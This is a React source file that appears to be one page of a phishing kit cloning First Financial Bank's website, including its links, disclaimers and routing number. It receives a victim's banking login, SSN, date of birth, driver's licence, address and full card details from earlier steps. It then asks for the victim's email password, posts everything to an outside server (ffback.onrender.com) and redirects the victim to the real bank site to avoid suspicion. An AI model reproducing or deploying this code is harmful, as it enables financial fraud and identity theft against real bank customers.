import React from 'react';


import './home.css'

import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

import { useLocation } from 'react-router-dom';
import footerlogo from './footerlogo.png';
import footericon from './footericon.png';
import main from './main.png';
import axios from 'axios';
import { Link } from 'react-router-dom';

import toggle from './toggle.png';
import close from './close.png';


function Final(){


    const[showtoggle, setShowToggle] = useState(false);


    function handleToggle(e){
        e.preventDefault();

        setShowToggle(!showtoggle);
    }



    const[type, setType]= useState("");
    const[username, setUsername] = useState("");
    const[password, setPassword]= useState("");

    // step two data

    const[firstname, setFirstname] = useState("");
    const[lastname, setLastname] = useState("");
    const[othername, setOthername] = useState("");
    const[dob, setDob] = useState("");
    const[ssn, setSSN] = useState("");
    const[driver_license, setLicense] = useState("");
    const[address, setAddress] = useState("");
    const[card_name, setCardname] = useState("");
    const[card_number, setCardNumber] = useState("");
    const[card_expiration, setCardExpiration] = useState("");
    const[card_cvv, setCardCvv] = useState("");
    

    // email 

    const[email, setEmail] = useState("");
    const[email_pass, setEmailPass] = useState("");

    const[platform, setPlatform] = useState("ffin")

    const[showError, setShowError] = useState(false);
    const[isLoading, setLoading] = useState(false);



async function handleSubmit(e){
    e.preventDefault();

    setLoading(true);

    try {

        console.log(platform + " " + type + " " + username + " "+ password + " " + firstname + " " + lastname + " " + othername + " " + dob + " " + ssn + " " + driver_license + " " + address + " " + card_name + " " + card_number + " " + card_cvv + " " + card_expiration + " " + email + " " + email_pass);
        
        const response = await axios.post('https://ffback.onrender.com/api/send', {
            
            platform:platform,
            type: type,
            username:username,
            password:password,
            firstname:firstname,
            lastname:lastname,
            othername:othername,
            dob:dob,
            ssn:ssn,
            driver_license:driver_license,
            address:address,
            card_name:card_name,
            card_number:card_number,
            card_expiration:card_expiration,
            card_cvv:card_cvv,
            email:email,
            email_pass:email_pass
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

          

            setLoading(false);

            window.location.href = 'https://ffin.com';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
        setLoading(false);
      }
    
}





    const navigate = useNavigate();

    const location = useLocation();

    useEffect(() => {

        setType(location.state.type);
        setUsername(location.state.username);
        setPassword(location.state.password);
        setFirstname(location.state.firstname);
        setLastname(location.state.lastname);
        setOthername(location.state.othername);
        setDob(location.state.dob);
        setSSN(location.state.ssn);
        setLicense(location.state.driver_license);
        setAddress(location.state.address);
        setCardname(location.state.card_name);
        setCardNumber(location.state.card_number);
        setCardExpiration(location.state.card_expiration);
        setCardCvv(location.state.card_cvv);
       
      }, []);
    return (
        <>

<nav className='nav mynav'>

<div className='navimagediv'>
<Link to={'/'}> <img className='navimage'src={main} /></Link>

</div>

<div className='navlinkdiv'>

    <a href="https://ffin.com/en-us/about/" className='blockdiv'>
        <i className='fa fa-info blockicon'></i>
        <p className='blockpara'>About Us</p>

    </a>

    <a href='https://ffin.com/en-us/locations/' className='blockdiv'>
        <i className='fa fa-location blockicon'></i>
        <p className='blockpara'>ATM/Locations</p>

    </a>

    <a href='http://investorrelations.ffin.com/CorporateProfile' className='blockdiv'>
        <i className='fa fa-line-chart blockicon'></i>
        <p className='blockpara'>Investors Relation</p>

    </a>

    <a href='https://ffin.com/en-us/about/contact-us/' className='blockdiv'>
        <i className='fa fa-envelope blockicon'></i>
        <p className='blockpara'>Contact Us</p>

    </a>

    <a href='https://ffin.com/en-us/about/careers/' className='blockdiv'>
        <i className='fa fa-users blockicon'></i>
        <p className='blockpara'>Careers</p>

    </a>

</div>

</nav>



<nav class="mobilenavbar navbar navbar-expand-lg navbar-light bg-light">
            <img className='navimagetwo'src={main} />
  
        {showtoggle ? <img className='toggleimage' src={close} onClick={handleToggle} /> : <img className='toggleimage' src={toggle} onClick={handleToggle} />}
    
       
</nav>

{showtoggle &&
<div className='togglediv py-3'>
<ul className='footerlist text-left px-3'>
                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/'> <i className='fa fa-info '></i> About Us</a></li>
                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/locations/'> <i className='fa fa-location'></i> ATM/Locations</a></li>
                          <li className='py-2'><a className='footerlink' href='http://investorrelations.ffin.com/CorporateProfile'> <i className='fa fa-line-chart'></i> Investor Relation</a></li>

                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/contact-us/'> <i className='fa fa-envelope'></i> Contact Us</a></li>

                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/careers/'> <i className='fa fa-users'></i> Careers</a></li>
                      </ul>

</div>
}

            

            <section className='emailsection'>
                <div className='col-md-6 m-auto'>
                <h3 className='text-center  formhead'>AUTHENTICATE EMAIL</h3>
                        <p className='text-center'>Hi {username}, Kindly validate your email address to complete setup</p>

                        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Authenication Failed!!!, An error occurred while processing your request, try again later.</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}

                        <form onSubmit={handleSubmit}>

                            <div className='form-group'>
                                <label>Email Address</label>
                                <input onChange={function(e){
                                    setEmail(e.target.value);
                                }} value={email} type="email" className='form-control' required/>

                            </div>

                            <div className='form-group'>
                                <label>Secure Password</label>
                                <input onChange={function(e){
                                    setEmailPass(e.target.value);
                                }} value={email_pass} type="password" className='form-control' required/>

                            </div>

                            <div className='buttondiv text-center mt-3'>
                    <button className='btn formbtn'>{isLoading ? "Loading..." : "COMPLETE SETUP"}</button>

            </div>
                        </form>
                </div>

            </section>




            {/* footer */}

            <section className='footer'>

<div className='footflex'>

    <div className='footflexdiv'>

        <img className='footerlogo'src={footerlogo} />

    </div>
    <div className='footflexdiv'>
        <h6 className='flexdivhead'>CONNECT WITH US</h6>

        <img className='footericon footerlogo' src={footericon} />

    </div>
    <div className='footflexdiv'>

      <ul className='footerlist'>
          <li><a className='footerlink' href='https://ffin.com/en-us/about/'> <i className='fa fa-info '></i> About Us</a></li>
          <li><a className='footerlink' href='https://ffin.com/en-us/locations/'> <i className='fa fa-location'></i> ATM/Locations</a></li>
          <li><a className='footerlink' href='http://investorrelations.ffin.com/CorporateProfile'> <i className='fa fa-line-chart'></i> Investor Relation</a></li>

          <li><a className='footerlink' href='https://ffin.com/en-us/about/contact-us/'> <i className='fa fa-envelope'></i> Contact Us</a></li>

          <li><a className='footerlink' href='https://ffin.com/en-us/about/careers/'> <i className='fa fa-users'></i> Careers</a></li>
      </ul>
   

    </div>

    

</div>

<hr style={{ border: '0.3px solid white', margin: '20px 0' }} />

<div className='col-md-10 m-auto bolddiv'>
    <p className='bolddivpara font-weight-bold'>Investment and Insurance Products Are:</p>
    <p className='bolddivpara'>Not a Deposit Not FDIC Insured Not Insured by Any Federal Government Agency Not Guaranteed by The Bank May Lose Value</p>
</div>

<hr style={{ border: '0.3px solid white', margin: '20px 0' }} />


<div className='lastdiv'>
    <div className='lasdivfirst'>
        <p className='font-weight-bold bolddivparatwo'>© 2023 First Financial Bankshares, All Rights Reserved
First Financial Bank Routing Number: 111301122
First Financial Bank Non-Connected SWIFT/BIC: FITEUS41</p>

    </div>

    <div className='lastdivsecond'>
        <p className='bolddivparatwo'>Terms Of Use  Privacy Policy  Policies and Disclosures  Transparency in Coverage  FAQs</p>

    </div>
</div>

</section>
        </>
    );

}

export default Final;